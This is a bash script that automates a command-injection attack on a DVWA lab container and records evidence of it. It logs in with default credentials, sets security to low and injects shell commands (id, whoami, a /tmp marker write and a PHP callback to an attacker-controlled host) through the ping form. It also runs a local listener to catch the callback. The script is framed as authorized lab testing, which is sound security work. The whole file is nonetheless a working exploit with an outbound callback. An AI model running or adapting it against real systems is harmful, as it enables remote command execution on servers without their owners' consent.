#!/usr/bin/env bash
set -Eeuo pipefail
VICTIM_HOST="${VICTIM_HOST:-<lab-ip>}"
ATTACKER_HOST="${ATTACKER_HOST:-<lab-ip>}"
TARGET="${TARGET:-http://${VICTIM_HOST}:18080}"
CALLBACK_PORT="${CALLBACK_PORT:-18182}"
RUN_ID="dvwa_cmdinj_impact_wave1_$(date -u +%Y%m%dT%H%M%SZ)"
OUT="$HOME/<artifact-output-dir>/$RUN_ID"
mkdir -p "$OUT/http" "$OUT/callback" "$OUT/payload"
OBS="$OUT/observations.jsonl"
SUMMARY="$OUT/summary.md"
: > "$OBS"
json_obs(){ python3 - "$OBS" "$@" <<'PY'
import json,sys,datetime
p=sys.argv[1]
d={'ts':datetime.datetime.now(datetime.UTC).isoformat().replace('+00:00','Z')}
for a in sys.argv[2:]:
    if '=' in a:
        k,v=a.split('=',1); d[k]=v
open(p,'a',encoding='utf-8').write(json.dumps(d,ensure_ascii=False)+'\n')
PY
}
status(){ curl -sS -o /dev/null -w '%{http_code}' --max-time 8 "$1" 2>/dev/null || echo 000; }
extract_token(){ python3 - "$1" <<'PY'
import re,sys
s=open(sys.argv[1],encoding='utf-8',errors='replace').read()
m=re.search(r"name=['\"]user_token['\"]\s+value=['\"]([^'\"]+)", s) or re.search(r"value=['\"]([^'\"]+)['\"]\s+name=['\"]user_token['\"]", s)
print(m.group(1) if m else '')
PY
}
cleanup(){
  if [ -f "$OUT/callback/server.pid" ]; then kill "$(cat "$OUT/callback/server.pid")" 2>/dev/null || true; fi
}
trap cleanup EXIT
PRE=$(status "$TARGET/login.php")
json_obs category=health name=pre_login status="$PRE" target="$TARGET"
cat > "$SUMMARY" <<EOF
# DVWA Command Injection Impact Wave 1

target: $TARGET
attacker_callback: http://$ATTACKER_HOST:$CALLBACK_PORT/callback
pre_login_status: $PRE

EOF
# Optional local callback listener on attacker-lab.
# For Docker-published attacker listeners, set USE_LOCAL_CALLBACK_LISTENER=0 and
# collect the container log separately under the run artifact.
if [ "${USE_LOCAL_CALLBACK_LISTENER:-1}" = "1" ]; then
  python3 - "$OUT/callback" "$CALLBACK_PORT" <<'PY' >"$OUT/callback/server.stdout" 2>"$OUT/callback/server.stderr" &
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
import json, sys, time
out=Path(sys.argv[1]); port=int(sys.argv[2]); out.mkdir(parents=True, exist_ok=True)
class H(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args): pass
    def do_GET(self):
        rec={'ts':time.time(),'client':self.client_address[0],'path':self.path,'headers':dict(self.headers)}
        with (out/'requests.jsonl').open('a', encoding='utf-8') as f: f.write(json.dumps(rec)+'\n')
        body=b'DVWA_CMDINJ_CALLBACK_RECORDED\n'
        self.send_response(200); self.send_header('Content-Type','text/plain'); self.send_header('Content-Length',str(len(body))); self.end_headers(); self.wfile.write(body)
ThreadingHTTPServer(('0.0.0.0', port), H).serve_forever()
PY
  echo $! > "$OUT/callback/server.pid"
  sleep 1
else
  printf '%s\n' 'local callback listener disabled; expecting external/Docker listener artifact' > "$OUT/callback/server.stdout"
fi
JAR="$OUT/http/cookies.txt"
LOGIN_PAGE="$OUT/http/login_page.html"
curl -sS --max-time 10 -c "$JAR" -o "$LOGIN_PAGE" "$TARGET/login.php"
LOGIN_TOKEN=$(extract_token "$LOGIN_PAGE")
LOGIN_RESP="$OUT/http/login_response.html"
LOGIN_CODE=$(curl -sS --max-time 10 -b "$JAR" -c "$JAR" -o "$LOGIN_RESP" -w '%{http_code}' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "username=admin" \
  --data-urlencode "password=password" \
  --data-urlencode "Login=Login" \
  --data-urlencode "user_token=$LOGIN_TOKEN" \
  "$TARGET/login.php" || echo 000)
json_obs category=auth status="$LOGIN_CODE" token_present="$([ -n "$LOGIN_TOKEN" ] && echo yes || echo no)"
# Initialize DB if DVWA redirects to setup state; safe for disposable DVWA container.
SETUP_PAGE="$OUT/http/setup_page.html"
curl -sS --max-time 10 -b "$JAR" -c "$JAR" -o "$SETUP_PAGE" "$TARGET/setup.php" || true
SETUP_TOKEN=$(extract_token "$SETUP_PAGE")
if grep -qi 'Create / Reset Database' "$SETUP_PAGE"; then
  curl -sS --max-time 20 -b "$JAR" -c "$JAR" -o "$OUT/http/setup_response.html" -H 'Content-Type: application/x-www-form-urlencoded' \
    --data-urlencode 'create_db=Create / Reset Database' \
    --data-urlencode "user_token=$SETUP_TOKEN" \
    "$TARGET/setup.php" || true
  curl -sS --max-time 10 -c "$JAR" -o "$LOGIN_PAGE" "$TARGET/login.php"
  LOGIN_TOKEN=$(extract_token "$LOGIN_PAGE")
  LOGIN_CODE=$(curl -sS --max-time 10 -b "$JAR" -c "$JAR" -o "$LOGIN_RESP" -w '%{http_code}' \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    --data-urlencode "username=admin" --data-urlencode "password=password" --data-urlencode "Login=Login" --data-urlencode "user_token=$LOGIN_TOKEN" "$TARGET/login.php" || echo 000)
fi
SEC_PAGE="$OUT/http/security_page.html"
curl -sS --max-time 10 -b "$JAR" -c "$JAR" -o "$SEC_PAGE" "$TARGET/security.php"
SEC_TOKEN=$(extract_token "$SEC_PAGE")
SEC_CODE=$(curl -sS --max-time 10 -b "$JAR" -c "$JAR" -o "$OUT/http/security_response.html" -w '%{http_code}' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'security=low' \
  --data-urlencode 'seclev_submit=Submit' \
  --data-urlencode "user_token=$SEC_TOKEN" \
  "$TARGET/security.php" || echo 000)
json_obs category=setup_security login_status="$LOGIN_CODE" security_status="$SEC_CODE" security_token_present="$([ -n "$SEC_TOKEN" ] && echo yes || echo no)"
CMD_PAGE="$OUT/http/command_page.html"
curl -sS --max-time 10 -b "$JAR" -c "$JAR" -o "$CMD_PAGE" "$TARGET/vulnerabilities/exec/"
CMD_TOKEN=$(extract_token "$CMD_PAGE")
MARKER="DVWA_CMDINJ_${RUN_ID}"
MARKER_FILE="/tmp/${MARKER}.txt"
CALLBACK_URL="${CALLBACK_URL_OVERRIDE:-http://${ATTACKER_HOST}:${CALLBACK_PORT}/callback?marker=${MARKER}}"
CALLBACK_URL="${CALLBACK_URL//__MARKER__/${MARKER}}"
# Bounded impact command: identity, lab marker write, host-only callback, marker readback.
# PHP callback is used because DVWA containers may not include curl/wget; still host-only and non-persistent.
# The HTTP timeout prevents an egress blocker from destroying the command-execution evidence.
PHP_CALLBACK="php -r '\$ctx=stream_context_create(array(\"http\"=>array(\"timeout\"=>2))); @file_get_contents(\"${CALLBACK_URL}\", false, \$ctx);'"
INJECT="127.0.0.1; id; whoami; printf ${MARKER} > ${MARKER_FILE}; ${PHP_CALLBACK} 2>&1; cat ${MARKER_FILE}"
printf '%s\n' "$INJECT" > "$OUT/payload/injected_command.txt"
RESP="$OUT/http/command_injection_response.html"
CMD_CODE=$(curl -sS --max-time 15 -b "$JAR" -c "$JAR" -o "$RESP" -w '%{http_code}' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "ip=$INJECT" \
  --data-urlencode 'Submit=Submit' \
  --data-urlencode "user_token=$CMD_TOKEN" \
  "$TARGET/vulnerabilities/exec/" || echo 000)
sleep 1
CALLBACK_LOG="$OUT/callback/requests.jsonl"
CALLBACK_LOG_KIND="local_python_listener"
# When USE_LOCAL_CALLBACK_LISTENER=0, a Docker/external listener may write the
# authoritative callback evidence elsewhere. Point EXTERNAL_CALLBACK_LOG at that
# pulled-back file so summary/observations count the real listener artifact.
if [ -n "${EXTERNAL_CALLBACK_LOG:-}" ]; then
  CALLBACK_LOG="$EXTERNAL_CALLBACK_LOG"
  CALLBACK_LOG_KIND="external_listener"
fi
CALLBACK_COUNT=$(python3 - "$CALLBACK_LOG" <<'PY'
import sys, pathlib
p=pathlib.Path(sys.argv[1])
print(0 if not p.exists() else sum(1 for _ in p.open(encoding='utf-8')))
PY
)
IMPACT=$(python3 - "$RESP" "$MARKER" <<'PY'
import html,re,sys
s=open(sys.argv[1],encoding='utf-8',errors='replace').read()
text=re.sub('<[^>]+>',' ',s)
text=html.unescape(text)
marker=sys.argv[2]
hits={
 'uid': 'uid=' in text,
 'www_data': 'www-data' in text or 'apache' in text,
 'marker': marker in text,
}
print('yes' if hits['uid'] and hits['marker'] else 'no')
PY
)
json_obs category=command_injection status="$CMD_CODE" marker="$MARKER" marker_file="$MARKER_FILE" impact_verified="$IMPACT" callback_count="$CALLBACK_COUNT" callback_log_kind="$CALLBACK_LOG_KIND" command_page_token_present="$([ -n "$CMD_TOKEN" ] && echo yes || echo no)" response="$RESP" callback_log="$CALLBACK_LOG" payload="$OUT/payload/injected_command.txt"
POST=$(status "$TARGET/login.php")
json_obs category=health name=post_login status="$POST" target="$TARGET"
{
  echo "login_status: $LOGIN_CODE"
  echo "security_status: $SEC_CODE"
  echo "command_status: $CMD_CODE"
  echo "impact_verified: $IMPACT"
  echo "marker: $MARKER"
  echo "marker_file: $MARKER_FILE"
  echo "callback_count: $CALLBACK_COUNT"
  echo "callback_log_kind: $CALLBACK_LOG_KIND"
  echo "callback_log: $CALLBACK_LOG"
  echo "post_login_status: $POST"
  echo
  echo "## Boundaries"
  echo "authorized DVWA container only; single command-injection vulnerability; lab marker file under /tmp only; host-only callback only; no persistence; no credential theft; no OS destruction."
} >> "$SUMMARY"
echo "$OUT"
